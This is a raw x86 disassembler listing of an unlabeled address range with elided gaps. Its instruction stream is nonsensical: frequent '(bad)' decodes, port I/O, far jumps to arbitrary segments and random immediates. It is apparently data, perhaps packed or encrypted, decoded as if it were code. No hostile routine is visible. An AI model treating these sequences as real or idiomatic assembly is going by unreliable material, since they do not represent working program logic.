  422e1a:	ficom  DWORD PTR [edx-0x1707c92b]
  422e20:	scas   al,BYTE PTR es:[edi]
  422e21:	sub    al,0x7d
  422e23:	adc    bh,0x27
  422e26:	lea    edi,[ecx+0x9b56273]
  422e2c:	and    DWORD PTR [ebx-0x2b],0xffffff85
  422e30:	mov    DWORD PTR [edx],ebx
  422e32:	into   
  422e33:	and    esp,edx
  422e35:	mov    ecx,0xf54d91df
  422e3a:	popf   
  422e3b:	into   
  422e3c:	mov    ds:0x93300060,al
  422e41:	(bad)
  422e44:	push   ebp
  422e45:	mov    ds:0xa7ef41d1,eax
  422e4a:	and    eax,0x70d5aaf
  422e4f:	xlat   BYTE PTR ds:[ebx]
  422e50:	jno    0x422e2e
  422e52:	mov    dh,0x7d
  422e54:	fs into 
  422e56:	cmc    
  422e57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e58:	push   ebx
  422e59:	shl    DWORD PTR [esi-0x6c9c8396],cl
  422e5f:	or     DWORD PTR [ecx],0xffffffeb
  422e62:	aas    
  422e63:	fidiv  DWORD PTR [edx+0x37]
  422e66:	or     edi,DWORD PTR [ecx-0x1f]
  422e69:	lock mov DWORD PTR ds:0x8c8b0d48,0x1380f2e8
  422e74:	push   0xa3802d85
  422e79:	stc    
  422e7a:	ins    BYTE PTR es:[edi],dx
  422e7b:	adc    edx,edx
  422e7d:	dec    edx
  422e7e:	or     eax,0x2dc73e42
  422e83:	pop    ds
  422e84:	push   eax
  422e85:	jecxz  0x422e5a
  422e87:	stos   BYTE PTR es:[edi],al
  422e88:	int    0x81
  422e8a:	xchg   edi,eax
  422e8b:	test   eax,0x3d4d0f5d
	...
  422ef4:	adc    DWORD PTR [ebp-0x78],0x19
  422ef8:	(bad)  
  422efa:	xchg   ebx,eax
  422efb:	fisttp WORD PTR [eax]
  422efd:	mov    eax,0xc603ca33
  422f02:	call   0x400:0x1745cb0
  422f09:	add    DWORD PTR [eax],eax
  422f0b:	add    BYTE PTR [ecx-0x42],dh
  422f0e:	push   ds
  422f0f:	in     eax,0xae
  422f11:	in     al,0x9c
  422f13:	ins    BYTE PTR es:[edi],dx
  422f14:	jmp    0xb851:0xfd8dfc34
  422f1b:	mov    ecx,0x5f862f7e
  422f20:	and    DWORD PTR [ebx+0x1b],0xffffffc8
  422f24:	mov    ds:0x6d35bf8c,al
  422f29:	je     0x422f9b
  422f2b:	add    DWORD PTR [eax+0x1c],edx
  422f2e:	jp     0x422edc
  422f30:	mov    cl,0xae
  422f32:	sub    esi,ecx
  422f34:	daa    
  422f35:	out    0x7d,eax
  422f37:	mov    cl,0xcf
  422f39:	jns    0x422f80
  422f3b:	test   eax,0xdf5a1eba
  422f40:	stos   BYTE PTR es:[edi],al
  422f41:	mov    al,0x6e
  422f43:	adc    DWORD PTR [edx-0xaeebbdc],edx
  422f49:	loopne 0x422eec
  422f4b:	dec    eax
  422f4c:	fsub   st,st(3)
  422f4e:	pop    ss
  422f4f:	sub    al,0x9
  422f51:	jns    0x422f0c
  422f53:	mov    DWORD PTR [edi+eax*1+0x4ef81e04],ecx
  422f5a:	outs   dx,BYTE PTR ds:[esi]
  422f5b:	ret    
  422f5c:	in     eax,0x24
  422f5e:	push   0x13
  422f60:	je     0x422f7b
  422f62:	pushf  
  422f63:	xlat   BYTE PTR ds:[ebx]
  422f64:	xchg   edx,eax
  422f65:	xchg   edx,eax
  422f66:	jae    0x422f30
  422f68:	and    eax,eax
  422f6a:	and    BYTE PTR [eax+0x16ef03c4],0xec
  422f71:	xchg   edi,eax
  422f72:	cmp    BYTE PTR [esi+0x41],dl
  422f75:	shl    eax,0x6c
  422f78:	mov    cl,0xd4
  422f7a:	xchg   esp,eax
  422f7b:	xor    edi,edi
  422f7d:	or     eax,0x879fc709
  422f82:	xchg   ebx,eax
  422f83:	mov    al,0xef
  422f85:	mov    edx,0xa6a32aad
  422f8a:	push   ebp
  422f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f8c:	mov    ds:0xf4970761,eax
  422f91:	push   ss
  422f92:	and    DWORD PTR [edx],0x9a8f8235
  422f98:	imul   ecx,DWORD PTR [eax],0x98ecb7fc
  422f9e:	adc    BYTE PTR [ebp-0x37967c0],bh
  422fa4:	call   0x4937:0x49456e7a
  422fab:	xchg   edx,eax
  422fac:	and    ah,dl
  422fae:	aad    0xcd
  422fb0:	loop   0x422fd3
  422fb2:	popa   
  422fb3:	loope  0x423000
  422fb5:	repnz retf 
  422fb7:	ret    
  422fb8:	cdq    
  422fb9:	sub    eax,0xda17719f
  422fbe:	mov    esp,0x2d30c51e
  422fc3:	mov    bl,0x8a
  422fc5:	arpl   WORD PTR [edx],bp
  422fc7:	scas   al,BYTE PTR es:[edi]
  422fc8:	adc    DWORD PTR [edi],0x44
  422fcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422fcc:	sub    ebx,ebx
  422fce:	outs   dx,BYTE PTR ds:[esi]
  422fcf:	shl    DWORD PTR [edx-0x11],0x88
  422fd3:	enter  0x5706,0x28
  422fd7:	mov    ecx,0x68ad2ee6
  422fdc:	fild   DWORD PTR [edi+ebx*8]
  422fdf:	sbb    eax,0x481a0756
  422fe4:	dec    esi
  422fe5:	call   0xf4145dc5
  422fea:	cmp    al,0xfa
  422fec:	xchg   ecx,eax
  422fed:	xor    bh,dl
  422fef:	xor    ebx,DWORD PTR [esi+0x35]
  422ff2:	push   eax
  422ff3:	adc    eax,0x1a5007b3
  422ff8:	adc    BYTE PTR ds:[eax+0x2a85e470],ch
  422fff:	sub    DWORD PTR [edx-0x36],ecx
  423002:	xchg   edi,eax
  423003:	pop    ebp
  423004:	loopne 0x422f8d
  423006:	xchg   ebx,eax
  423007:	adc    DWORD PTR [edx+0x69],ebx
  42300a:	jle    0x422fcb
  42300c:	call   0xf11c16
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ecx+ecx*4+0x607b5f29],esp
  423085:	jne    0x423088
  423087:	add    BYTE PTR [ecx+eax*1],al
  42308a:	add    BYTE PTR [eax],al
  42308c:	jnp    0x4230f2
  42308e:	lds    ecx,FWORD PTR [esi+0x10]
  423091:	or     bh,BYTE PTR [ecx+0x38a3fa2a]
  423097:	imul   ebp,edx,0x81dfcd01
  42309d:	xor    DWORD PTR [eax+0x67b419c1],0x5aba2765
  4230a7:	xor    al,0x4a
  4230a9:	lods   eax,DWORD PTR ds:[esi]
  4230aa:	fistp  QWORD PTR [edx-0x5674bd7]
  4230b0:	xor    DWORD PTR [ecx+eiz*4-0x18],eax
  4230b4:	popa   
  4230b5:	bound  esi,QWORD PTR [eax+0x19]
  4230b8:	xor    ecx,edx
  4230ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230bb:	dec    edi
  4230bc:	out    0x1c,eax
  4230be:	js     0x42309d
  4230c0:	mov    bh,0x25
  4230c2:	xchg   DWORD PTR [edx-0x1027228c],ecx
  4230c8:	push   ds
  4230c9:	lea    ecx,[esi]
  4230cb:	sub    DWORD PTR [esi+esi*4],ebp
  4230ce:	push   edi
  4230cf:	or     edi,DWORD PTR [ebp-0xc02f016]
  4230d5:	popf   
  4230d6:	aad    0xa9
  4230d8:	aam    0x3a
  4230da:	in     al,dx
  4230db:	shl    BYTE PTR [esp+edx*4-0x3e],0x9a
  4230e0:	imul   eax,DWORD PTR [ebx+ebp*1+0x1f],0xffffff8c
  4230e5:	and    ah,BYTE PTR [ebx]
  4230e7:	mov    ah,0xc9
  4230e9:	push   ss
  4230ea:	jge    0x423083
  4230ec:	les    eax,FWORD PTR [ebp-0x5976f183]
  4230f2:	inc    esp
  4230f3:	idiv   BYTE PTR [ecx-0x68ca6c65]
  4230f9:	repnz mov al,ds:0xa9b0d698
  4230ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423100:	xchg   ecx,eax
  423101:	(bad)  
  423102:	and    al,0x3
  423104:	into   
  423105:	mov    al,0x6a
  423107:	or     al,0x21
  423109:	mov    dl,0x2f
  42310b:	jnp    0x42312f
  42310d:	mov    ch,0x9
  42310f:	outs   dx,DWORD PTR ds:[esi]
  423110:	out    dx,al
  423111:	pop    edx
  423112:	repnz sub BYTE PTR [ebp-0x10137b03],dh
  423119:	aaa    
  42311a:	fist   DWORD PTR [edi]
  42311c:	dec    ecx
  42311d:	es mov ecx,0x1f961424
  423123:	outs   dx,DWORD PTR ds:[esi]
  423124:	popa   
  423125:	mov    ah,0x21
  423127:	test   eax,0xe596b51b
  42312c:	push   ebp
  42312d:	xchg   BYTE PTR [ecx+0x7994e797],ch
  423133:	push   ecx
  423134:	or     eax,0xb01c3262
  423139:	aas    
  42313a:	setne  BYTE PTR [ebx]
  42313d:	fstp   st(4)
  42313f:	mov    bl,0x0
  423141:	dec    ecx
  423142:	es popa 
  423144:	mov    DWORD PTR [edx-0x7a],0xd0b2e82
  42314b:	push   0xffffff96
  42314d:	stos   DWORD PTR es:[edi],eax
  42314e:	lods   eax,DWORD PTR ds:[esi]
  42314f:	adc    BYTE PTR [ebx+ebx*2-0x6f60c8a5],ch
  423156:	and    BYTE PTR [ebp-0x2c5b61bb],0x72
  42315d:	mov    ds:0x7ebe823b,al
  423162:	nop
  423163:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423164:	arpl   cx,bp
  423166:	mov    al,0x9c
  423168:	xchg   DWORD PTR [eax+0x75],edi
  42316b:	mov    edi,DWORD PTR [edi]
  42316d:	fisub  DWORD PTR [ebp-0x14]
  423170:	or     al,0xc0
  423172:	jae    0x4230fb
  423174:	sti    
  423175:	jno    0x423109
  423177:	or     DWORD PTR [ebx+0x5e0a0143],0x45
  42317e:	add    dh,BYTE PTR [edi+0x9]
  423181:	jecxz  0x423145
  423183:	mov    esp,0xa7a828d0
  423188:	ss push ecx
  42318a:	mov    ds,esp
  42318c:	adc    di,WORD PTR [ecx+0xa0]
	...
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x72a694d1],esp
  423204:	fs jbe 0x423208
  423207:	add    BYTE PTR [ecx+eax*1],al
  42320a:	add    BYTE PTR [eax],al
  42320c:	dec    esi
  42320d:	int    0xac
  42320f:	xchg   edx,eax
  423210:	sahf   
  423211:	lods   al,BYTE PTR ds:[esi]
  423212:	jmp    0x406d4
  423217:	mov    eax,0x8e3d5b6
  42321c:	in     eax,dx
  42321d:	rcl    bh,1
  42321f:	jo     0x42326b
  423221:	inc    ebp
  423222:	pop    edx
  423223:	sub    ebx,eax
  423225:	mov    ebp,0xc008afaa
  42322a:	imul   esi,DWORD PTR [esi-0x7b291c7b],0xffffff85
  423231:	dec    ebx
  423232:	sub    DWORD PTR [esi+ebp*8+0x68],edx
  423236:	pop    ebx
  423237:	push   ds
  423238:	lock scas eax,DWORD PTR es:[edi]
  42323a:	jmp    0x4231f8
  42323c:	sbb    ebx,DWORD PTR [eax+0x5d]
  42323f:	stc    
  423240:	(bad)  
  423241:	sbb    BYTE PTR [edx-0x26451ba2],dl
  423247:	pop    ss
  423248:	add    BYTE PTR [edi-0x4180cb43],bl
  42324e:	je     0x423220
  423250:	push   0xbd34b241
  423255:	lea    ecx,[edx+ebp*8]
  423258:	mov    ecx,0x57a806e0
  42325d:	pusha  
  42325e:	add    ecx,DWORD PTR [ebx]
  423260:	pusha  
  423261:	ins    BYTE PTR es:[edi],dx
  423262:	inc    ebx
  423263:	je     0x423281
  423265:	xor    DWORD PTR [ebx],0xffffffe3
  423268:	ds fcomip st,st(2)
  42326b:	adc    al,0xc3
  42326d:	mov    eax,0x9323f26a
  423272:	sbb    al,0xef
  423274:	mov    ds:0x183da153,al
  423279:	and    edi,ecx
  42327b:	sbb    ebx,DWORD PTR [ebp+ecx*1+0x344a46b5]
  423282:	mov    ch,0xe8
  423284:	ret    
  423285:	jbe    0x4232e0
  423287:	push   ebp
  423288:	das    
  423289:	push   ds
  42328a:	or     DWORD PTR [edi+0x7c],esi
  42328d:	push   esi
  42328e:	ds int 0xd6
  423291:	sbb    ah,BYTE PTR [ebp+0x6f]
  423294:	or     edi,DWORD PTR [eax-0xd]
  423297:	cmp    eax,0x806b9881
  42329c:	std    
  42329d:	xor    dh,BYTE PTR [ebp+0x3e803361]
  4232a3:	pop    ecx
  4232a4:	loope  0x423314
  4232a6:	clc    
  4232a7:	les    edx,FWORD PTR ds:0x5bd619c5
  4232ad:	out    dx,eax
  4232ae:	pop    ss
  4232af:	push   ss
  4232b0:	push   cs
  4232b1:	syscall 
  4232b3:	(bad)
  4232b6:	push   esp
  4232b7:	cmp    bh,BYTE PTR [di-0x73]
  4232bb:	sub    al,0xa1
  4232bd:	xor    al,0x21
  4232bf:	mov    BYTE PTR [esi+0x68],bl
  4232c2:	jle    0xb3cfd397
  4232c8:	jp     0x4232f5
  4232ca:	or     ebx,DWORD PTR [edi+edi*1-0x140e5c76]
  4232d1:	xor    al,0x50
  4232d3:	sbb    DWORD PTR [eax+0x78],0xffffffd6
  4232d7:	mov    eax,ds:0xa1a1a3d2
  4232dc:	fisub  WORD PTR [ecx-0x30fbc8b7]
  4232e2:	push   esp
  4232e3:	pushf  
  4232e4:	xor    esp,DWORD PTR [esi-0x69738964]
  4232ea:	push   ecx
  4232eb:	fs (bad) 
  4232ed:	test   BYTE PTR [edx+ebx*8],0x47
  4232f1:	mov    bl,0x40
  4232f3:	or     BYTE PTR ds:0x4ed2ef0e,0xbb
  4232fa:	sbb    DWORD PTR [ecx],ebp
  4232fc:	jb     0x42336e
  4232fe:	loope  0x423328
  423300:	push   0x3f
  423302:	out    0x4b,eax
  423304:	nop
  423305:	sahf   
  423306:	jg     0x423294
  423308:	ss (bad) 
  42330a:	lds    edx,FWORD PTR ds:[ecx+0xd7de5e]
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0xd9130f44
  423382:	jo     0x423398
  423384:	push   0x4000177
  423389:	add    DWORD PTR [eax],eax
  42338b:	add    al,bl
  42338d:	mov    dl,0xdd
  42338f:	mov    ebp,0x66a04e8a
  423394:	imul   esp,DWORD PTR [ebp+0x70e3741],0x530e6d30
  42339e:	das    
  42339f:	jae    0x423328
  4233a1:	dec    esp
  4233a2:	pop    edx
  4233a3:	inc    edx
  4233a4:	sbb    bl,BYTE PTR [ecx]
  4233a6:	xchg   ebp,eax
  4233a7:	loop   0x423373
  4233a9:	lods   al,BYTE PTR ds:[esi]
  4233aa:	xchg   esp,eax
  4233ab:	aas    
  4233ac:	jne    0x423407
  4233ae:	xchg   ecx,eax
  4233af:	inc    edi
  4233b0:	in     al,0xb3
  4233b2:	(bad)  
  4233b3:	repz retf 0x6473
  4233b7:	jns    0x42342f
  4233b9:	clc    
  4233ba:	scas   al,BYTE PTR es:[edi]
  4233bb:	int3   
  4233bc:	call   0xf5be:0x153cd629
  4233c3:	loopne 0x42340c
  4233c5:	stc    
  4233c6:	xchg   esi,eax
  4233c7:	mov    dh,0x6d
  4233c9:	and    al,BYTE PTR [edx-0x29]
  4233cc:	xlat   BYTE PTR ds:[ebx]
  4233cd:	out    0x79,eax
  4233cf:	nop
  4233d0:	adc    BYTE PTR [eax],al
  4233d2:	bnd jmp 0x495bf029
  4233d8:	fisttp DWORD PTR [esi]
  4233da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233db:	data16 jg 0x423399
  4233de:	mov    WORD PTR [edx],?
  4233e0:	addr16 jb 0x42339c
  4233e3:	add    BYTE PTR [edi+0x4a88ea],ah
  4233e9:	jmp    0x18421b69
  4233ee:	shl    DWORD PTR [eax],0xe0
  4233f1:	or     al,dl
  4233f3:	sub    ch,cl
  4233f5:	mov    ecx,0x2452fad
  4233fa:	test   al,0xe2
  4233fc:	xor    eax,0x3087be9a
  423401:	adc    BYTE PTR [eax+eax*8-0x309151e4],ah
  423408:	out    0xac,eax
  42340a:	and    DWORD PTR [eax+0x77],0x45
  42340e:	sub    al,0x25
  423410:	pop    esp
  423411:	popa   
  423412:	jae    0x423477
  423414:	mov    al,0xd1
  423416:	dec    edx
  423417:	push   ds
  423418:	and    eax,0x1cecd077
  42341d:	dec    ebp
  42341e:	iret   
  42341f:	cli    
  423420:	jmp    0x4233a7
  423422:	inc    esp
  423423:	pop    ds
  423424:	sahf   
  423425:	rcl    DWORD PTR [ebx+0x4a289274],cl
  42342b:	jecxz  0x42346d
  42342d:	mov    bl,0x59
  42342f:	test   al,0x9d
  423431:	int    0xf0
  423433:	mov    bh,BYTE PTR [ecx+0x75da9825]
  423439:	xchg   esp,eax
  42343a:	and    BYTE PTR [ecx+0x646cc740],0x19
  423441:	(bad)  
  423442:	in     al,dx
  423443:	lock cmp bh,dh
  423446:	lock adc BYTE PTR [eax+esi*4],al
  42344a:	outs   dx,BYTE PTR ds:[esi]
  42344b:	xor    al,0x4d
  42344d:	xor    edx,DWORD PTR [eax]
  42344f:	xor    esi,DWORD PTR [ebx+edi*4+0x39564212]
  423456:	mov    cl,0xc9
  423458:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423459:	ss (bad) 
  42345b:	xor    BYTE PTR [ebx],dl
  42345d:	enter  0x77d9,0xc2
  423461:	mov    esi,0x1f9c27af
  423466:	push   es
  423467:	rcr    ah,1
  423469:	jmp    0x42349a
  42346b:	jp     0x4233f4
  42346d:	pop    edi
  42346e:	jmp    0x2ad5:0x7c98c950
  423475:	xor    al,0xd2
  423477:	test   BYTE PTR [ecx-0x12],0xdd
  42347b:	inc    eax
  42347c:	sub    BYTE PTR [esi-0x40fee349],ah
  423482:	pop    es
  423483:	dec    ecx
  423484:	add    BYTE PTR [edx-0x5],0xb6
  423488:	arpl   WORD PTR [edx+0x67],si
  42348b:	pop    ds
  42348c:	addr16 sbb dh,ch
  42348f:	pop    es
	...
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	sub    DWORD PTR [eax],ebx
  423502:	pop    ecx
  423503:	jmp    0x104:0x1786c
  42350a:	add    BYTE PTR [eax],al
  42350c:	mov    ebp,0x17c72d34
  423511:	xor    esp,0x2fc04ed0
  423517:	add    DWORD PTR [ecx-0x6a],esp
  42351a:	or     al,0x64
  42351c:	xor    DWORD PTR [esi],edx
  42351e:	push   0xc3315700
  423523:	(bad)  
  423524:	and    DWORD PTR [edx],ebx
  423526:	push   cs
  423527:	sub    al,ch
  423529:	mov    esi,0xc8b30d90
  42352e:	fwait
  42352f:	pop    eax
  423530:	into   
  423531:	push   esp
  423532:	fmul   DWORD PTR [eax-0x5e]
  423535:	add    DWORD PTR [ecx],esi
  423537:	arpl   WORD PTR [esi-0x15f30b34],cx
  42353d:	jmp    0xa4608384
  423542:	dec    edx
  423543:	mov    ds:0x5749973b,al
  423548:	jo     0x4235c5
  42354a:	into   
  42354b:	pop    ds
  42354c:	dec    edx
  42354d:	ficom  DWORD PTR [ebx-0x1]
  423550:	daa    
  423551:	mov    ch,0x32
  423553:	arpl   WORD PTR [ebx],cx
  423555:	push   edi
  423556:	jge    0x423590
  423558:	push   0xe23c010e
  42355d:	sbb    ecx,0xffffffc5
  423560:	bound  ecx,QWORD PTR [ebx+0x26fdb9fd]
  423566:	out    0x0,al
  423568:	(bad)  
  423569:	push   0x6618ca22
  42356e:	and    dl,dh
  423570:	ficom  DWORD PTR [ecx-0x35363965]
  423576:	cmp    bh,dl
  423578:	out    0x8c,al
  42357a:	xchg   ebx,eax
  42357b:	not    bl
  42357d:	clc    
  42357e:	mov    BYTE PTR [edi],0x6d
  423581:	mul    DWORD PTR [ebx+0x78]
  423584:	mov    dl,0x10
  423586:	retf   
  423587:	jno    0x4235e4
  423589:	mov    bh,0x2
  42358b:	dec    ebx
  42358c:	xchg   ecx,eax
  42358d:	mov    esi,0xfb8a2ecc
  423592:	bnd jns 0x4235eb
  423595:	pop    edi
  423596:	aaa    
  423597:	lods   eax,DWORD PTR ds:[esi]
  423598:	xor    BYTE PTR [esi-0x59],ah
  42359b:	or     esp,esp
  42359d:	popf   
  42359e:	stos   BYTE PTR es:[edi],al
  42359f:	inc    edx
  4235a0:	js     0x42355f
  4235a2:	ds (bad) 
  4235a4:	idiv   DWORD PTR [esi+0x42]
  4235a7:	sbb    ebp,DWORD PTR [eax]
  4235a9:	mov    ebx,DWORD PTR [ecx+0x14ce2a0f]
  4235af:	scas   eax,DWORD PTR es:[edi]
  4235b0:	and    ebp,DWORD PTR [ebp+0x43]
  4235b3:	jns    0x4235c5
  4235b5:	lods   al,BYTE PTR ds:[esi]
  4235b6:	xor    DWORD PTR [ebx+0x66743527],ebp
  4235bc:	or     DWORD PTR [ebx-0x2459ed83],edi
  4235c2:	mov    BYTE PTR [eax-0x30361289],dl
  4235c8:	or     eax,0x597cf420
  4235cd:	inc    eax
  4235ce:	repz icebp 
  4235d0:	pop    edi
  4235d1:	fs ret 
  4235d3:	js     0x4235ed
  4235d5:	loop   0x4235b5
  4235d7:	in     eax,dx
  4235d8:	fiadd  WORD PTR [esi-0x2f]
  4235db:	ds ret 0xa55c
  4235df:	mov    esp,0xcad3ff80
  4235e4:	rcl    ch,1
  4235e6:	cmp    ebx,ebp
  4235e8:	fxch   st(5)
  4235ea:	(bad)  
  4235eb:	and    DWORD PTR [ebp-0x5c],eax
  4235ee:	dec    edi
  4235ef:	push   ebx
  4235f0:	fdiv   DWORD PTR [edi]
  4235f2:	jne    0x4235b8
  4235f4:	mov    ebx,0x3da2a17c
  4235f9:	sbb    edx,ebx
  4235fb:	in     eax,0x47
  4235fd:	cli    
  4235fe:	inc    eax
  4235ff:	das    
  423600:	mov    ebp,0xd36e46ed
  423605:	out    0x17,eax
  423607:	(bad)  
  423608:	and    eax,ecx
  42360a:	or     eax,0x865851ea
  42360f:	mov    ah,0x0
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x32da7a13
  423683:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423684:	jo     0x4236ff
  423686:	add    DWORD PTR [eax],eax
  423688:	add    al,0x1
  42368a:	add    BYTE PTR [eax],al
  42368c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42368d:	or     eax,DWORD PTR [edi]
  42368f:	xor    BYTE PTR [edi+0x6b],dh
  423692:	cwde   
  423693:	dec    ecx
  423694:	and    al,0xcf
  423696:	pop    ebp
  423697:	pusha  
  423698:	sbb    DWORD PTR [ebp+edx*8+0x5a],eax
  42369c:	loop   0x4236ce
  42369e:	dec    ecx
  42369f:	fnstsw WORD PTR [ecx-0x47]
  4236a2:	lds    esi,FWORD PTR [ebx]
  4236a4:	cmp    eax,0xed4633aa
  4236a9:	sbb    BYTE PTR ds:0xc9729ec6,ah
  4236af:	fsubr  DWORD PTR [ecx]
  4236b1:	mov    bl,0x89
  4236b3:	in     al,dx
  4236b4:	add    eax,edx
  4236b6:	or     BYTE PTR [edx-0x16],bl
  4236b9:	jne    0x4236bd
  4236bb:	mov    bl,0x94
  4236bd:	sbb    BYTE PTR [edi+0x43],0x8e
  4236c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236c2:	mov    eax,0x4302905e
  4236c7:	and    al,0xe6
  4236c9:	jle    0x4236af
  4236cb:	push   ds
  4236cc:	pop    es
  4236cd:	stos   DWORD PTR es:[edi],eax
  4236ce:	popf   
  4236cf:	into   
  4236d0:	loope  0x423740
  4236d2:	and    edi,DWORD PTR [eax+0x3b1970eb]
  4236d8:	clc    
  4236d9:	push   edx
  4236da:	lahf   
  4236db:	aas    
  4236dc:	push   ebp
  4236dd:	in     eax,dx
  4236de:	call   0xf3fd:0x1a9d8f4c
  4236e5:	into   
  4236e6:	stc    
  4236e7:	mul    BYTE PTR [ebp+0x5617ffa5]
  4236ed:	xchg   edx,eax
  4236ee:	mov    ebp,0x386e73b2
  4236f3:	xchg   edx,eax
  4236f4:	push   ss
  4236f5:	lea    esp,[bx+si]
  4236f8:	add    edi,DWORD PTR [ecx]
  4236fa:	outs   dx,DWORD PTR ds:[esi]
  4236fb:	mov    eax,DWORD PTR [ecx-0x739dde09]
  423701:	mov    cl,0x71
  423703:	pop    ds
  423704:	mov    cs:0x3e22910f,al
  42370a:	sbb    cl,dl
  42370c:	in     al,0xf
  42370e:	lock xor bh,BYTE PTR [ecx+ebp*4+0x70395050]
  423716:	scas   al,BYTE PTR es:[edi]
  423717:	fisttp DWORD PTR [edi+0x10]
  42371a:	out    0x37,al
  42371c:	and    BYTE PTR [ebx-0x5f7b503d],ah
  423722:	(bad)  
  423724:	sahf   
  423725:	(bad)  
  423726:	sub    edi,DWORD PTR [ebp-0x3fb4098]
  42372c:	sti    
  42372d:	xor    esi,ebp
  42372f:	les    eax,FWORD PTR [eax*2-0x414c8d9d]
  423736:	test   DWORD PTR [ecx+0x79],ecx
  423739:	sub    dl,ch
  42373b:	mov    al,0x7a
  42373d:	xchg   edi,eax
  42373e:	add    al,0x47
  423740:	and    DWORD PTR [ebx+0x24f85018],ebx
  423746:	inc    esi
  423747:	dec    cl
  423749:	inc    edx
  42374a:	and    al,0xc1
  42374c:	mov    edi,?
  42374e:	xor    ecx,ebx
  423750:	shr    eax,1
  423752:	shl    BYTE PTR [ebx],cl
  423754:	sbb    DWORD PTR [ebx],esi
  423756:	dec    eax
  423757:	lahf   
  423758:	jmp    0x1a35fb4e
  42375d:	daa    
  42375e:	imul   edx,ebx,0xc592be47
  423764:	push   0xda89624c
  423769:	jmp    0x91df:0x19d3496
  423770:	fadd   st(3),st
  423772:	xor    DWORD PTR [edx],edx
  423774:	add    DWORD PTR [esi-0x6eee741a],0xffffffe4
  42377b:	jl     0x423772
  42377d:	xor    eax,0x47477385
  423782:	jle    0x423784
  423784:	hlt    
  423785:	xchg   esp,eax
  423786:	into   
  423787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423788:	int3   
  423789:	aam    0xcc
  42378b:	lock push ebp
  42378d:	inc    ecx
  42378e:	dec    ecx
  42378f:	inc    ebx
	...
  4237f4:	xor    al,0x23
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7a74:0x50dd7327
  423806:	add    DWORD PTR [eax],eax
  423808:	add    al,0x1
  42380a:	add    BYTE PTR [eax],al
  42380c:	mov    ch,0x29
  42380e:	(bad)  
  423810:	mov    bh,0x9e
  423812:	shl    eax,cl
  423814:	lds    edx,FWORD PTR [eax]
  423816:	ja     0x4237d3
  423818:	lock hlt 
  42381a:	in     al,dx
  42381b:	fild   DWORD PTR [edi-0x38263ec8]
  423821:	loop   0x4237e6
  423823:	shl    BYTE PTR [esp+edi*2+0x6e],1
  423827:	mov    edi,0xc58cd15c
  42382c:	daa    
  42382d:	dec    edi
  42382e:	mov    al,0x68
  423830:	push   edi
  423831:	mov    ss,WORD PTR [esi+0x27e1313b]
  423837:	test   DWORD PTR [esi+0x3158b11e],0x74d0ae4d
  423841:	call   0x86e57365
  423846:	push   edi
  423847:	sub    al,0x47
  423849:	jbe    0x42380f
  42384b:	daa    
  42384c:	stc    
  42384d:	sbb    BYTE PTR [ecx+eiz*8],al
  423850:	sub    al,0xdb
  423852:	test   al,0x2d
  423854:	pop    ebx
  423855:	mov    ah,0x8
  423857:	pop    ecx
  423858:	xor    bl,BYTE PTR [ebx-0x58]
  42385b:	dec    esi
  42385c:	jne    0x4237ef
  42385e:	dec    esp
  42385f:	mov    eax,0xcbb5471d
  423864:	out    dx,al
  423865:	sub    al,0x45
  423867:	repz and eax,0xceb5d63a
  42386d:	mov    ebp,fs
  42386f:	call   0xe89d0bdc
  423874:	push   eax
  423875:	xor    eax,eax
  423877:	or     eax,0xad80c0
  42387c:	sahf   
  42387d:	push   edx
  42387e:	sub    al,0xfa
  423880:	sbb    eax,0x3b312623
  423885:	pop    eax
  423886:	sbb    eax,ecx
  423888:	adc    BYTE PTR [eax],dh
  42388a:	outs   dx,BYTE PTR ds:[esi]
  42388b:	or     eax,0x6a4e0ccc
  423890:	retf   
  423891:	add    DWORD PTR [eax+0x34b80c70],esi
  423897:	push   ds
  423898:	rcr    DWORD PTR [edi-0x27],cl
  42389b:	mov    eax,ds:0xbed5453
  4238a0:	or     al,0xb2
  4238a2:	(bad)
  4238a6:	cmp    al,0x94
  4238a8:	mov    ds:0x954be531,eax
  4238ad:	leave  
  4238ae:	xchg   esi,eax
  4238af:	pop    es
  4238b0:	cmp    DWORD PTR [ebx-0x3],0xdb83ce0c
  4238b7:	push   esi
  4238b8:	ja     0x423905
  4238ba:	test   DWORD PTR [edx-0x41],ecx
  4238bd:	iret   
  4238be:	jae    0x42385d
  4238c0:	and    edi,DWORD PTR [esi]
  4238c2:	adc    al,0x16
  4238c4:	repz fidivr DWORD PTR [edx*1-0x50d7cb63]
  4238cc:	out    0xb1,al
  4238ce:	mov    dl,0x55
  4238d0:	pop    ds
  4238d1:	fstp   QWORD PTR [ecx-0x453bcf7d]
  4238d7:	pop    ss
  4238d8:	hlt    
  4238d9:	test   eax,0x8f6c6856
  4238de:	js     0x4238df
  4238e0:	xchg   ebp,eax
  4238e1:	inc    esi
  4238e2:	(bad)  
  4238e3:	mov    ebx,0xdf140b70
  4238e8:	lahf   
